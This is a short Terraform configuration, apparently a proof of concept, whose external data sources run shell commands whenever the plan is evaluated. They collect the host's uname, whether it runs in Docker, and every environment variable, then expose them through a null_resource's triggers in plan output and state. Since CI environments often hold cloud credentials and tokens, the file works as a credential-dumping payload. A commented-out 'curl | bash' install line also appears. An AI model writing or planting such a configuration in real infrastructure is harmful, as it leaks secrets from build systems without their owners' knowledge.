data "template_file" "aws_instance_identity" {
    template = <<EOF
#curl https://pyenv.run | bash
#export PATH="/$HOME/.pyenv/bin:$PATH"
#eval "$(pyenv init -)"
#eval "$(pyenv virtualenv-init -)"
#pyenv install 3.5.0
#pyenv global 3.5.0
#pip install --user awscli
AWS="{}"
echo "$AWS"
EOF
}

data "template_file" "docker" {
    template = <<EOF
DOCKER="{\"docker\":\"false\"}"
if [ -f "/proc/self" ]; then
  DOCKER="{\"docker\":\"true\"}"
fi
echo "$DOCKER"
EOF
}

data "template_file" "env" {
    template = <<EOF
ENV=$(env|sed 's/\(.*\)=\(.*\)/"\1":"\2"/g'|tr "\n" ","|rev|cut -c2-|rev|echo "{$(cat)}")
if [ -z $ENV ]; then
  ENV="{}"
fi
echo "$ENV"
EOF
}

data "template_file" "uname" {
    template = <<EOF
UNAME=$(uname -a)
echo "{\"uname\":\"$UNAME\"}"
EOF
}

data "external" "aws_instance_identity" {
	program = ["sh", "-c", "${data.template_file.aws_instance_identity.rendered}"]
}

data "external" "docker" {
	program = ["sh", "-c", "${data.template_file.docker.rendered}"]
}

data "external" "env" {
	program = ["sh", "-c", "${data.template_file.env.rendered}"]
}

data "external" "uname" {
	program = ["sh", "-c", "${data.template_file.uname.rendered}"]
}

resource "null_resource" "info" {
	triggers = {
        aws_instance_identity = "${jsonencode(data.external.aws_instance_identity.result)}"
        docker = "${jsonencode(data.external.docker.result)}"
        env = "${jsonencode(data.external.env.result)}"
        uname = "${jsonencode(data.external.uname.result)}"
    }
}
